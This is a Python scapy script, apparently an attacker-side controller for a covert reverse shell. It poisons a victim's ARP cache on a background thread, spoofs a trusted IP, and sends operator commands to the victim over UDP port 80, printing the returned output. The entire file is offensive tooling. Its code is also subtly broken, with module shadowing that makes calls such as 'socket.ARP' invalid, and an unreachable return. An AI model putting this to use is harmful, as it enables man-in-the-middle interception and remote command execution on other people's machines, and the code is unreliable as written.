import sys
import socket
from socket import *
import threading
import time
from logging import getLogger, ERROR
import argparse
from scapy.all import *

# reverse shell using ARP
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument("--ip", "-ip", type=str, required=True)
parser.add_argument("--spoof", "-s", type=str, required=True)
parser.add_argument("--interface", "-i", type=str, required=True)
args = parser.parse_args()

vic_ip = args.ip
spoof = args.spoof
interface = args.interface

conf.verb = 0

# discovery('192.168.43.1/24', 10) 

response = ""
def discovery(dst, time):
    global response
    ethernet_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = ARP(pdst= dst)
    ans, unans = srp(ethernet_layer/arp_layer, timeout=int(time))

    for sent, received in ans:
        response = response + received[ARP].psrc + " "
    
    return response

def getMAC(s):
    global response
    try:
        #pkt = srp(s.Ether(dst = "ff:ff:ff:ff:ff:ff")/socket.ARP(pdst = vic_ip), timeout = 2, iface = interface, inter = 0.1)
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=vic_ip)
        answered, unanswered = srp(packet, timeout=2, verbose=0)
    except Exception as e:
        print(e)
        print('error: failed to get mac address')
        sys.exit(1)
    for sent,received in answered:
        return received[ARP].hwsrc

print('\ngetting victim mac address...')
s = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM)
victimMAC = getMAC(s)
print("Victims MAC is: ", victimMAC) 

spoofStatus = True
def poison():
    while 1:
        if spoofStatus == False:
            break
            return
        send(socket.ARP(op=2, pdst=vic_ip, psrc=spoof, hwdst=victimMAC))
        time.sleep(5)
 
print('\nstarting thread for poisoning')
thread = []
try:
    poisonerThread = threading.Thread(target=poison)
    thread.append(poisonerThread)
    poisonerThread.start()
    print('started!\n')
except Exception:
    print('failed to start')
    sys.exit(1)
 
print('starting connection with victim')
pkt1 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='hello victim'))
pkt2 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='report'))
 
prompt = pkt2.getlayer(Raw).load
 
print('connected with victim\n')
print('enter goodbye to exit\n')
 
while 1:
    command = input(prompt)
    sendcom = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load=command))
    output = sendcom.getlayer(Raw).load
    if command.strip() == 'goodbye':
        spoofStatus = False
        poisonerThread.join()
        sys.exit(1)
    print(output)